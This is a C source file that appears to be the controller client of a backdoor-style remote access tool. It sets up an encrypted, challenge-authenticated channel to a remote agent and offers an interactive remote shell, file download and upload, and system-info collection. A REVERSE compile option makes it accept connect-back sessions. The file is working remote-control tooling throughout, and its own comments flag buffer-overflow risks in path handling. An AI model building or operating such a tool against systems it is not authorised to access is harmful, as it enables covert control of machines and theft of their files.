#include <sys/time.h>
#include <termios.h>
#include "basic.h"
#include "app.h"
#include "sha1.h"
#include "connection.h"

char command_line[MSGSIZE + 5];
char command[MSGSIZE + 5];
char opt_first[MSGSIZE + 5];
char opt_second[MSGSIZE + 5];
char send_msg_buf[MSGSIZE + 5], recv_msg_buf[MSGSIZE + 5];
int send_msg_len, recv_msg_len;

int init_client(){
	struct sha1_context sha1_ctx;
	struct timeval tv;
	int pid;
	byte digest[20], IV[40];
	byte *IV1 = IV;
	byte *IV2 = IV + 20;
	pid = getpid();
	gettimeofday(&tv, NULL);
	sha1_starts(&sha1_ctx);
	sha1_update(&sha1_ctx, (byte*)&tv, sizeof(tv));
	sha1_update(&sha1_ctx, (byte*)&pid, sizeof(pid));
	sha1_finish(&sha1_ctx, digest);
	memcpy(IV1, digest, 20);
	++pid;
	gettimeofday(&tv, NULL);
	sha1_starts(&sha1_ctx);
	sha1_update(&sha1_ctx, (byte*)&tv, sizeof(tv));
	sha1_update(&sha1_ctx, (byte*)&pid, sizeof(pid));
	sha1_finish(&sha1_ctx, digest);
	memcpy(IV2, digest, 20);	
	send_data(IV, 40, 0);
#ifdef DEBUG
	printf("[+]: The key: ");
	for(int i = 0; i < 40; ++i)
		printf("%02x ", IV[i]);
	printf("\n");
#endif
	setup_context(&send_ctx, key, IV1);
	setup_context(&recv_ctx, key, IV2);
	send_msg(challenge, 16);
	recv_msg(recv_msg_buf, &recv_msg_len);
	if(recv_msg_len != 16 || memcmp(recv_msg_buf, challenge, 16)) return 8;
	return 0;
}

int parse_command(){
	int len = strlen(command_line);
	int i = 0, j;
	memset(command, 0, sizeof(command));
	memset(opt_first, 0, sizeof(opt_first));
	memset(opt_second, 0, sizeof(opt_second));
	--len;	//filter '\n'
	while(i < len && command_line[i] == ' ') ++i;	//filter space
	for(j = 0; j < BUFSIZE && i < len && command_line[i] != ' '; ++i, ++j){
		command[j] = command_line[i];
	}
	command[j] = 0;
	if(j == 0) return 9;
	while(i < len && command_line[i] == ' ') ++i;	//filter space
	for(j = 0; j < BUFSIZE && i < len && command_line[i] != ' '; ++i, ++j){
		opt_first[j] = command_line[i];
	}
	opt_first[j] = 0;
	while(i < len && command_line[i] == ' ') ++i;
	for(j = 0; j < BUFSIZE && i < len && command_line[i] != ' '; ++i, ++j){
		opt_second[j] = command_line[i];
	}
	opt_second[j] = 0;
	return 0;
	//exception handling;
}

int get_file(char *dest_path, char *sour_path){	//point out the meaning of parameter
	char *tmp;
	char flag;
	int fd;
	int len, sum = 0;
	struct stat s_buf;
#ifdef DEBUG
	printf("[+]: Source file path: %s\n", sour_path);
#endif
	stat(dest_path,&s_buf);
	if(!S_ISDIR(s_buf.st_mode)){
		flag = 0;
		send_msg(&flag, 1);
		return 12;
	}
	send_msg(sour_path, strlen(sour_path));
	recv_msg(recv_msg_buf, &recv_msg_len);
	if(recv_msg_len == 1 && recv_msg_buf[0] == 0) return 11;
	if(dest_path[strlen(dest_path) - 1] != '/')
		strcat(dest_path, "/");
	tmp = strrchr(sour_path, '/');
	if(tmp) ++tmp;
	else tmp = sour_path;
	if(strlen(tmp) + strlen(dest_path) >= BUFSIZE) return 13;
	strcat(dest_path, tmp);	//buffer overflow
#ifdef DEBUG
	printf("[+]: Destination file path: %s\n", dest_path);
#endif
	if((fd = creat(dest_path, 0644)) < 0) return 14;
	while(1){	//to be perfected
		recv_msg(recv_msg_buf, &recv_msg_len);
		if(recv_msg_len <= 0) break;
		sum += recv_msg_len;
		write(fd, recv_msg_buf, recv_msg_len);
	}
	printf("[+]: Receive %d bytes\n", sum);
	close(fd);
	return 0;
}

int put_file(char *dest_path, char *sour_path){
	int len, sum = 0;
	int fd;
	char* tmp;
	char flag;
	struct stat s_buf;
	if(dest_path[strlen(dest_path) - 1] != '/')
		strcat(dest_path, "/");
	tmp = strrchr(sour_path, '/');
	if(tmp) ++tmp;
	else tmp = sour_path;
	if(strlen(tmp) + strlen(dest_path) >= BUFSIZE) return 13;
	strcat(dest_path, tmp);	//buffer overflow
	stat(sour_path, &s_buf);
	if(!S_ISREG(s_buf.st_mode)){
		flag = 0;
		send_msg(&flag, 1);
		return 11;
	}
#ifdef DEBUG
	printf("[+]: Source file path: %s\n", sour_path);
#endif
	send_msg(dest_path, strlen(dest_path));
	recv_msg(recv_msg_buf, &recv_msg_len);
	if(recv_msg_len == 1 && recv_msg_buf[0] == 0) return 12;
	if((fd = open(sour_path, O_RDONLY)) < 0) return 16;
	while(1){
		send_msg_len = read(fd, send_msg_buf, BUFSIZE);
		if(send_msg_len <= 0) break;
		send_msg(send_msg_buf, send_msg_len);
		sum += send_msg_len;
	}
	printf("[+]: Send %d bytes\n", sum);
	close(fd);
	return 0;
}

int run_shell(char *shell_command){
	fd_set rd;
	int len;
	struct termios tp, tr;
	send_msg(shell_command, strlen(shell_command));
	if(tcgetattr(0, &tp) < 0 ) return false;
        memcpy((void*)&tr, (void*)&tp, sizeof(tr));
	tr.c_iflag &= ~(ISTRIP|INLCR|IGNCR|ICRNL|IXON|IXANY|IXOFF);
	tr.c_lflag &= ~(ISIG|ICANON|ECHO|ECHOE|ECHOK|ECHONL|IEXTEN);
	tr.c_oflag &= ~OPOST;
	tr.c_cc[VMIN] = 1;
	tr.c_cc[VTIME] = 0;
        if(tcsetattr(0, TCSAFLUSH, &tr) < 0) return false;
	while(1){
		FD_ZERO(&rd);
		FD_SET(0, &rd);
		FD_SET(client, &rd);
		select(client + 1, &rd, NULL, NULL, NULL);
		if(FD_ISSET(client, &rd)){
			recv_msg(recv_msg_buf, &len);
			if(len <= 0) break;
			write(1, recv_msg_buf, len);
		}
		if(FD_ISSET(0, &rd)){
			if((len = read(0, send_msg_buf, BUFSIZE)) <= 0) break;
			send_msg(send_msg_buf, len);
		}
	}
	if(tcsetattr(0, TCSAFLUSH, &tp) < 0) return false;
	return 0;
}

int sysinfo(){
	struct in_addr *ip;
	struct utsname *uts;
	recv_msg(recv_msg_buf, &recv_msg_len);
	ip = (struct in_addr *)recv_msg_buf;
	uts = (struct utsname *)(recv_msg_buf + 4);
	printf("IP address: \t%s\n", inet_ntoa(*ip));
	printf("sysname: \t%s\n", uts->sysname);
    printf("nodename: \t%s\n", uts->nodename);
    printf("release: \t%s\n", uts->release);
    printf("version: \t%s\n", uts->version);
    printf("machine: \t%s\n", uts->machine);
	return 0;
}

int exec_command(){
	int ret;
	char command_msg;
	if(ret = parse_command()) return ret;
	if(strcmp(command, "shell") == 0){
		if(strlen(opt_first) == 0)
			strcpy(opt_first, "exec bash --login");
		command_msg = RUN_SHELL;
		send_msg(&command_msg, 1);
		run_shell(opt_first);	//exception handling
	}
	else if(strcmp(command, "get") == 0){
        	if(strlen(opt_first) == 0) return 10;
		command_msg = GET_FILE;
		send_msg(&command_msg, 1);
		//download a file from opt_s to opt_d;
		if(strlen(opt_second))
            		return get_file(opt_first, opt_second);	//exception handling
        	else{
			strcpy(opt_second, "./");
			return get_file(opt_second, opt_first);
		}
	}
	else if(strcmp(command, "put") == 0){
		if(strlen(opt_first) == 0) return 10;
		command_msg = PUT_FILE;
		send_msg(&command_msg, 1);
		//upload a file from opt_s to opt_d;
		if(strlen(opt_second))
			return put_file(opt_first, opt_second);	//exception handling
		else{
			strcpy(opt_second, "./");
			return put_file(opt_second, opt_first);
		}
	}
	else if(strcmp(command, "sysinfo") == 0){
		command_msg = SYSINFO;
		send_msg(&command_msg, 1);
		return sysinfo();
	}
	else
		return 15;
	return 0;
}

void usage(){
	printf("\t-h host\tIp address.\n");
	printf("\t-p port\tListen port.\n");
	printf("\t-u\tPrint help message.");
	exit(0);
}

int main(int argc, char *argv[]){
	int ch;
	int ret = 0;
	while((ch = getopt(argc, argv, "h:p:u")) != -1){
		switch(ch){
			case 'h':
				if((host = inet_addr(optarg)) == INADDR_NONE){
					ret = 1;
					EXIT;
				}
				break;
			case 'p':
				if((port = atoi(optarg)) == 0){
					ret = 2;
					EXIT;
				}
				break;
			case 'u':
				usage(); break;
			default:
				printf("Existence of unidentified parameters\n");
				exit(0);
		}
	}

	struct sockaddr_in addr;
	int addr_len;
#ifdef REVERSE
	if(ret = create_server_socket()) EXIT;
	//whether the output shoule be added
	if((client = accept(server, (struct sockaddr *)&addr, &addr_len)) < 0){
		close(server);
		ret = 17;
		EXIT;
	}
#else	
	if((client = socket(AF_INET, SOCK_STREAM, 0)) < 0){
		ret = 3;
		EXIT;
	}
	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = host;
	addr.sin_port = htons(port);
	if(connect(client, (struct sockaddr *)&addr, sizeof(addr)) < 0){
		close( client );
		ret = 4;
		EXIT;
	}
#endif
#ifdef DEBUG
	printf("[+]: Connection success\n");
#endif
	if(ret = init_client()) EXIT;
#ifdef DEBUG
	printf("[+]: Init success\n");
#endif
	memset(command_line, 0, sizeof(command_line));
	fgets(command_line, BUFSIZE, stdin);
	if(ret = exec_command()) EXIT;
#ifdef REVERSE
	close(server);
#endif
	return 0;
catch:	handle_error(ret);
	return 0;
}
